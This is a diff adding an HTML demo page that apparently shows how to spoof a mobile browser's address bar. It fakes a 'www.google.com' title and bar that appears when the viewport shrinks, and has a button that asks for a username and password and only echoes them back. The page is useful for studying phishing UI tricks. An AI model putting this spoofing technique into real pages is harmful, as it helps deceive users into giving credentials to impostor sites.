@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>www.google.com</title>
+
+<meta name="theme-color" content="#f1f3f4" id="themeColor">
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: system-ui, -apple-system, Roboto, Arial, sans-serif;
+  background: #0f0f0f;
+  color: #eaeaea;
+  min-height: 200vh; /* supaya ada konten panjang */
+  padding: 24px;
+}
+
+h1 {
+  font-weight: 400;
+}
+
+.fake-bar {
+  position: fixed;
+  left: 0;
+  width: 100%;
+  background: #121212;
+  border-top: 1px solid #303134;
+  text-align: center;
+  padding: 8px 0;
+  font-size: 14px;
+  color: #eaeaea;
+  z-index: 9999;
+
+  bottom: 0;
+  opacity: 0;
+  visibility: hidden;
+
+  transition:
+    opacity .25s ease,
+    visibility .25s ease,
+    bottom .2s ease;
+}
+
+.fake-bar.show {
+  opacity: 1;
+  visibility: visible;
+}
+
+.debug {
+  margin-top: 24px;
+  font-size: 13px;
+  color: #9aa0a6;
+  line-height: 1.6;
+}
+</style>
+</head>
+
+<body>
+
+  <h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+
+
+<div class="debug" id="debug"></div>
+
+<div class="fake-bar" id="fakeBar">
+  www.google.com
+</div>
+
+<script>
+const fakeBar = document.getElementById("fakeBar");
+const debug = document.getElementById("debug");
+const themeColor = document.getElementById("themeColor");
+
+let lastViewportHeight = window.innerHeight;
+let lastScrollY = window.scrollY;
+let lastInputTime = 0;
+let active = false;
+
+/* Helper */
+function setTheme(color) {
+  themeColor.setAttribute("content", color);
+}
+
+function showBar(bottomPx) {
+  if (active) return;
+  active = true;
+  setTheme("#ffffff");
+  fakeBar.style.bottom = bottomPx + "px";
+  fakeBar.classList.add("show");
+}
+
+function hideBar() {
+  active = false;
+  fakeBar.classList.remove("show");
+  fakeBar.style.bottom = "0px";
+  setTheme("#f1f3f4");
+}
+
+/* Track typing (to EXCLUDE real input usage) */
+document.addEventListener("input", () => {
+  lastInputTime = Date.now();
+});
+
+/* Track scroll */
+window.addEventListener("scroll", () => {
+  lastScrollY = window.scrollY;
+});
+
+/* === CORE HEURISTIC === */
+if (window.visualViewport) {
+  window.visualViewport.addEventListener("resize", () => {
+    const vv = window.visualViewport;
+    const heightDiff = lastViewportHeight - vv.height;
+    const keyboardLike = heightDiff > 120; // px threshold
+    const now = Date.now();
+
+    const focusedEl = document.activeElement;
+    const hasFocusedInput =
+      focusedEl &&
+      (focusedEl.tagName === "INPUT" ||
+       focusedEl.tagName === "TEXTAREA" ||
+       focusedEl.isContentEditable);
+
+    const recentlyTyped = now - lastInputTime < 800;
+    const scrollMoved = Math.abs(window.scrollY - lastScrollY) > 40;
+
+    /* DEBUG INFO */
+
+
+    /* HEURISTIC DECISION */
+    if (
+      keyboardLike &&
+      !hasFocusedInput &&
+      !recentlyTyped &&
+      !scrollMoved
+    ) {
+      const bottomOffset = window.innerHeight - vv.height;
+      showBar(bottomOffset);
+    } else {
+      hideBar();
+    }
+
+    lastViewportHeight = vv.height;
+  });
+}
+
+/* Orientation reset */
+window.addEventListener("orientationchange", () => {
+  hideBar();
+});
+</script>
+
+</body>
+</html>
